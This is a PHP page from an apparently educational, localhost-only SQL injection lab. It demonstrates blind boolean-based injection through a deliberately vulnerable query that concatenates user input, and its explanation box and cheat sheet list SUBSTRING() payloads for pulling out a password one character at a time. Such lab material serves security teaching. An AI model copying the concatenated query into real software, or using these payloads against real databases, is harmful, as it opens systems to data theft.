<?php
// ============================================================
// blind_vulnerable.php - Blind SQL Injection Demo
// SQL Injection Educational Lab
// FOR EDUCATIONAL PURPOSES ONLY - localhost only
// ============================================================

require_once 'db.php';

$response    = null;
$query       = '';
$errorDetail = '';
$userCount   = 0;

// Handle reset
if (isset($_POST['reset'])) {
    resetUsersTable();
}

// Count users in the table (to show database status)
try {
    $pdo = getDB();
    $userCount = (int) $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
} catch (PDOException $e) {
    // ignore
}

// Handle check
if (isset($_POST['check'])) {
    $username = $_POST['username'] ?? '';

    // VULNERABLE: Direct string concatenation
    $query = "SELECT * FROM users WHERE username='$username'";

    try {
        $pdo    = getDB();
        $stmt   = $pdo->query($query);
        $result = $stmt->fetchAll();
        $response = count($result) > 0 ? 'TRUE' : 'FALSE';
    } catch (PDOException $e) {
        $response = 'ERROR';
        $errorDetail = $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blind SQL Injection - SQL Injection Lab</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: #e0e0e0; min-height: 100vh; }
        .container { max-width: 750px; margin: 0 auto; padding: 40px 20px; }
        a.back { color: #00e5ff; text-decoration: none; font-size: 0.9rem; }
        a.back:hover { text-decoration: underline; }
        h1 { color: #ff5252; margin: 16px 0 4px; }
        .tag { display: inline-block; background: #b71c1c; color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; font-weight: bold; margin-bottom: 16px; }
        .info-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; margin-bottom: 24px; line-height: 1.6; font-size: 0.9rem; }
        .info-box code { display: block; background: #0d0d1a; padding: 6px 10px; border-radius: 4px; color: #ff8a80; margin: 6px 0; font-size: 0.85rem; word-break: break-all; }
        .step-list { margin: 12px 0; padding-left: 20px; }
        .step-list li { margin-bottom: 8px; }
        .step-list li code { display: inline; margin: 0; }
        form { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 24px; margin-bottom: 24px; }
        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #aaa; }
        input[type="text"] {
            width: 100%; padding: 10px 12px; margin-bottom: 16px; border: 1px solid #333;
            border-radius: 6px; background: #0d0d1a; color: #e0e0e0; font-size: 0.95rem;
        }
        .btn-row { display: flex; gap: 12px; }
        button { padding: 10px 24px; border: none; border-radius: 6px; font-weight: bold; font-size: 0.95rem; cursor: pointer; }
        button[name="check"] { background: #c62828; color: #fff; }
        button[name="check"]:hover { background: #e53935; }
        button[name="reset"] { background: #37474f; color: #fff; }
        button[name="reset"]:hover { background: #546e7a; }
        .query-box { background: #0d0d1a; border: 1px solid #333; border-radius: 6px; padding: 14px; margin-bottom: 20px; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #ffab91; word-break: break-all; }
        .query-box span { color: #666; }
        .response-box { text-align: center; padding: 32px; border-radius: 8px; margin-bottom: 24px; font-size: 1.4rem; font-weight: bold; }
        .response-box.true  { background: #1b5e20; color: #69f0ae; border: 2px solid #2e7d32; }
        .response-box.false { background: #b71c1c33; color: #ff5252; border: 2px solid #c62828; }
        .response-box.error { background: #e6510033; color: #ffab91; border: 2px solid #e65100; }
        .response-box small { display: block; font-size: 0.8rem; font-weight: normal; margin-top: 6px; color: #aaa; }
        .db-status { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 6px; padding: 10px 14px; margin-bottom: 16px; font-size: 0.85rem; }
        .db-status.ok { border-color: #2e7d32; color: #69f0ae; }
        .db-status.empty { border-color: #c62828; color: #ff5252; }
        .cheat-sheet { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; }
        .cheat-sheet h3 { color: #00e5ff; margin-bottom: 12px; font-size: 1rem; }
        .cheat-sheet table { width: 100%; border-collapse: collapse; }
        .cheat-sheet th, .cheat-sheet td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #2a2a4a; font-size: 0.82rem; }
        .cheat-sheet th { color: #888; }
        .cheat-sheet td code { color: #ff8a80; }
        .true-mark  { color: #69f0ae; font-weight: bold; }
        .false-mark { color: #ff5252; }
    </style>
</head>
<body>
<div class="container">
    <a class="back" href="index.php">&larr; Back to Menu</a>
    <h1>Blind SQL Injection</h1>
    <span class="tag">Vulnerable</span>

    <!-- Database status -->
    <?php if ($userCount > 0): ?>
        <div class="db-status ok">Database: <?= $userCount ?> user(s) in table</div>
    <?php else: ?>
        <div class="db-status empty">Database: Table is EMPTY - click "Reset Database" below</div>
    <?php endif; ?>

    <!-- Explanation -->
    <div class="info-box">
        <strong>What makes it "blind"?</strong><br>
        This page only responds with <strong>TRUE</strong> (user exists) or <strong>FALSE</strong> (user not found).
        No table data is ever displayed. But an attacker can still extract data one character at a time.<br><br>

        <strong>Technique: Boolean-based extraction using SUBSTRING()</strong>
        <ol class="step-list">
            <li>Confirm the user exists:<br>
                <code>admin' AND '1'='1</code> &rarr; should return TRUE</li>
            <li>Guess first character of password:<br>
                <code>admin' AND SUBSTRING(password,1,1)='a</code> &rarr; TRUE (it's 'a'!)</li>
            <li>Guess second character:<br>
                <code>admin' AND SUBSTRING(password,2,1)='d</code> &rarr; TRUE (it's 'd'!)</li>
            <li>Continue until the full password is reconstructed.</li>
        </ol>
    </div>

    <!-- Form -->
    <form method="POST">
        <label for="username">Check if User Exists</label>
        <input type="text" id="username" name="username"
               placeholder="admin' AND SUBSTRING(password,1,1)='a"
               value="<?= htmlspecialchars($_POST['username'] ?? '') ?>">
        <div class="btn-row">
            <button type="submit" name="check" value="1">Check</button>
            <button type="submit" name="reset" value="1">Reset Database</button>
        </div>
    </form>

    <?php if ($response !== null): ?>
        <!-- Show the executed query -->
        <div class="query-box">
            <span>Executed SQL:</span><br>
            <?= htmlspecialchars($query) ?>
        </div>

        <!-- TRUE / FALSE response -->
        <?php if ($response === 'TRUE'): ?>
            <div class="response-box true">
                TRUE &mdash; User exists
                <small>The condition evaluated to true (rows returned)</small>
            </div>
        <?php elseif ($response === 'FALSE'): ?>
            <div class="response-box false">
                FALSE &mdash; User not found
                <small>The condition evaluated to false (no rows returned)</small>
            </div>
        <?php else: ?>
            <div class="response-box error">
                ERROR &mdash; SQL syntax error
                <small><?= htmlspecialchars($errorDetail) ?></small>
            </div>
        <?php endif; ?>
    <?php endif; ?>

    <!-- Cheat sheet -->
    <div class="cheat-sheet">
        <h3>Quick Reference: Extracting admin's password character by character</h3>
        <p style="color:#aaa; font-size:0.82rem; margin-bottom:12px;">
            The admin password is <strong>admin123</strong>. Try these payloads:
        </p>
        <table>
            <tr><th>Payload</th><th>Expected</th></tr>
            <tr>
                <td><code>admin' AND SUBSTRING(password,1,1)='a</code></td>
                <td><span class="true-mark">TRUE</span></td>
            </tr>
            <tr>
                <td><code>admin' AND SUBSTRING(password,1,1)='b</code></td>
                <td><span class="false-mark">FALSE</span></td>
            </tr>
            <tr>
                <td><code>admin' AND SUBSTRING(password,2,1)='d</code></td>
                <td><span class="true-mark">TRUE</span></td>
            </tr>
            <tr>
                <td><code>admin' AND SUBSTRING(password,3,1)='m</code></td>
                <td><span class="true-mark">TRUE</span></td>
            </tr>
            <tr>
                <td><code>admin' AND SUBSTRING(password,5,1)='n</code></td>
                <td><span class="true-mark">TRUE</span></td>
            </tr>
            <tr>
                <td><code>admin' AND SUBSTRING(password,6,1)='1</code></td>
                <td><span class="true-mark">TRUE</span></td>
            </tr>
            <tr>
                <td><code>admin' AND LENGTH(password)='8</code></td>
                <td><span class="true-mark">TRUE</span></td>
            </tr>
        </table>
    </div>
</div>
</body>
</html>
